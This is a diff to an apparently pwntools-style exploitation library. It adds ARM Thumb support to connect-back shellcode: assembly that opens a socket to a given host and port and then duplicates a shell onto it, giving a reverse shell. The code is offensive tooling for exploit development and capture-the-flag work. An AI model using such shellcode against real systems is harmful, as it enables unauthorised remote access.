@@ -1,13 +1,13 @@
 from pwn.internal.shellcode_helper import *
 from .. import dupsh, pushstr
 
-@shellcode_reqs(arch=['i386', 'amd64'], os=['linux', 'freebsd'], network='ipv4')
-def connectback(host, port):
+@shellcode_reqs(arch=['i386', 'amd64', 'thumb'], os=['linux', 'freebsd'], network='ipv4')
+def connectback(host, port, sock = False):
     """Args: host, port
     Standard connect back type shellcode."""
-    return connect(host, port), dupsh()
+    return connect(host, port), dupsh(sock = sock)
 
-@shellcode_reqs(arch=['i386', 'amd64'], os=['linux', 'freebsd'], network='ipv4')
+@shellcode_reqs(arch=['i386', 'amd64', 'thumb'], os=['linux', 'freebsd'], network='ipv4')
 def connect(host, port, arch = None, os = None):
     """Args: host, port
     Connects to host on port.  Leaves socket in EBP."""
@@ -21,9 +21,49 @@ def connect(host, port, arch = None, os = None):
             return _connect_freebsd_i386(host, port)
     elif arch == 'amd64':
         return _connect_amd64(host, port, os)
+    elif arch == 'thumb':
+				if os in ['linux']:
+						return _connect_linux_thumb(host, port)
     else:
         no_support('connect', os, arch)
 
+def _connect_linux_thumb(host, port):
+		def mov(r, v):
+				return pwn.shellcode.mov(r, v, raw = True)
+
+
+		out = mov('r0', 'AF_INET')
+		out+= mov('r1', 'SOCK_STREAM')
+		out+= mov('r2', 0)
+		out+= mov('r7', '281') # Implement SYS_SOCKET 
+
+		out+= """
+					svc 1
+					adr r1, sockaddr
+					"""
+
+		out+= mov('r2', 16)
+		out+= mov('r3', 'AF_INET')
+		
+		out+= mov('r6', 'r0')
+
+		out+= """
+					strh r3, [r1]
+					b after_sockaddr
+					sub r1,r1,r1
+					"""
+		out+="""
+				sockaddr:
+					.short 0x4141
+					.short %(port)d
+					.word 0x%(host)08x
+				after_sockaddr:
+					add r7, #2
+					svc 1
+					""" % {'host': ip(host),
+								 'port': htons(port)}
+		return out
+					
 def _connect_linux_i386(host, port):
     return """
             ;; Connect to %(hostname)s on %(portnum)d
